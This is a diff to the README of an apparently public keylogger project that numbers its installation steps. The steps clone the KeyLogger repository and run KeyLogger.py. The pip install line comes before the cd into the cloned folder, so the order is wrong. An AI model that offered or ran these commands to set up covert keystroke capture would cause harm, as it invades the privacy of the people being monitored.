@@ -13,13 +13,13 @@ The author is not responsible for any actions made by this tool.
 
 ### Instalation
 
-sudo apt install python
-sudo apt install git
-sudo apt update && sudo apt upgrade
-git clone https://github.com/invisibleTech1/KeyLogger.git
-pip install -r requirements.txt
-cd KeyLogger
-python KeyLogger.py
+1.sudo apt install python
+2.sudo apt install git
+3.sudo apt update && sudo apt upgrade
+4.git clone https://github.com/invisibleTech1/KeyLogger.git
+5.pip install -r requirements.txt
+6.cd KeyLogger
+7.python KeyLogger.py
 
 #### Made By:
 invisibleTech1
